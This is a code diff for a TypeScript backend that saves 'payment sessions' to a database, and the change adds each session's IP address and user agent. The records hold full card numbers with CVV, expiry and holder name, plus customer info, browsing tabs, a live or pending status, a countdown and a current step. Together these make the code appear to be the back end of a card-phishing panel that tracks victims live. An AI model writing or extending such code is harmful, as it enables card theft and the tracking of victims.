@@ -16,6 +16,7 @@ export async function getPaymentSessions() {
         bankName: h.bank_name, expiry: h.expiry, cvv: h.cvv, cardHolder: h.card_holder
       })),
       isOnline: !!r.is_online, countdownSeconds: r.countdown_seconds || 0,
+      ip: r.ip || '', ua: r.ua || '',
       createdAt: r.created_at, updatedAt: r.updated_at
     });
   }
@@ -45,14 +46,15 @@ export async function upsertSession(data: any) {
   const existing = queryOne('SELECT id FROM payment_sessions WHERE id=?', [data.id]);
   if (!existing) {
     run(`INSERT INTO payment_sessions (id, session_id, customer_id, frontend_url, status, current_step,
-      card_info, customer_info, browsing_tabs, is_online, countdown_seconds, pending_at, last_card_info)
-      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`, [
+      card_info, customer_info, browsing_tabs, is_online, countdown_seconds, pending_at, last_card_info, ip, ua)
+      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`, [
       data.id, data.sessionId || 1166, data.customerId || '', data.frontendUrl || '',
       data.status || 'live', data.currentStep || 'card',
       JSON.stringify(data.cardInfo || {}), JSON.stringify(data.customerInfo || {}),
       JSON.stringify(data.browsingTabs || []), data.isOnline !== false ? 1 : 0,
       data.countdownSeconds || 0, data.status === 'pending' ? new Date().toISOString() : null,
-      JSON.stringify(data.cardInfo || {})
+      JSON.stringify(data.cardInfo || {}),
+      data.ip || '', data.ua || ''
     ]);
   } else {
     const sets: string[] = ["updated_at=datetime('now')"];
@@ -66,6 +68,8 @@ export async function upsertSession(data: any) {
     if (data.countdownSeconds !== undefined) { sets.push('countdown_seconds=?'); vals.push(data.countdownSeconds); }
     if (data.status === 'pending') { sets.push('pending_at=?'); vals.push(new Date().toISOString()); }
     if (data.cardInfo) { sets.push('last_card_info=?'); vals.push(JSON.stringify(data.cardInfo)); }
+    if (data.ip !== undefined) { sets.push('ip=?'); vals.push(data.ip); }
+    if (data.ua !== undefined) { sets.push('ua=?'); vals.push(data.ua); }
     vals.push(data.id);
     run('UPDATE payment_sessions SET ' + sets.join(',') + ' WHERE id=?', vals);
   }
